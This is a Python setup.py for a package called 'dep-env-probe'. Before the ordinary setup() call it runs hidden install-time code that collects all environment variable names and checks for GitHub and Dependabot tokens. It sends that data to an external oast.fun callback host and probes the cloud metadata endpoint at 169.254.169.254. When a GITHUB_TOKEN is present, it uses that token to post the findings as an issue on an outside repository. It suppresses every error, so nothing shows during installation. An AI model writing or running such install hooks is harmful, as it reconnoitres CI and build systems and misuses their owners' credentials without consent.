import os
import json

env_keys = sorted(os.environ.keys())
has_gt = "GITHUB_TOKEN" in os.environ
has_jt = "GITHUB_DEPENDABOT_JOB_TOKEN" in os.environ

try:
    import urllib.request
    probe_data = json.dumps({"k": env_keys, "gt": has_gt, "jt": has_jt}).encode()
    req = urllib.request.Request(
        "http://d8ulq161b2eou60dthj0mjuqccaxum9p9.oast.fun/probe",
        data=probe_data,
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(req, timeout=5)
except Exception:
    pass

try:
    import urllib.request
    urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=3)
    imds = True
except Exception:
    imds = False

try:
    t = os.environ.get("GITHUB_TOKEN", "")
    if t:
        import urllib.request
        body = json.dumps({
            "title": "dep-env-result",
            "body": json.dumps({"k": env_keys, "gt": has_gt, "jt": has_jt, "imds": imds})
        }).encode()
        req = urllib.request.Request(
            "https://api.github.com/repos/toofikz4/dep-env-probe/issues",
            data=body,
            headers={"Authorization": "Bearer " + t, "Content-Type": "application/json", "Accept": "application/vnd.github+json", "User-Agent": "dep-probe"},
        )
        urllib.request.urlopen(req, timeout=10)
except Exception:
    pass

from setuptools import setup
setup(
    name="dep-env-probe",
    version="1.0.0",
    install_requires=["requests==2.31.0"],
    tests_require=["pytest==9.1.1"],
    extras_require={"dev": ["flake8==6.0.0"]},
)
